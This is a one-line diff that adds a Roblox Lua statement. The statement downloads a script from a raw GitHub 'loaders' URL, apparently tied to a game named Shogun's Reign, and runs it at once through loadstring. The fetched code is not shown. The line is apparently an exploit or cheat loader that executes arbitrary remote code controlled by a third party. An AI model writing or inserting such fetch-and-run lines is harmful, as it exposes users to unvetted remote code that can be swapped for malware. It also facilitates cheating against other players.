@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/shogun-s-reign-spam4-xazdu7sbfiyr6v.lua"))()
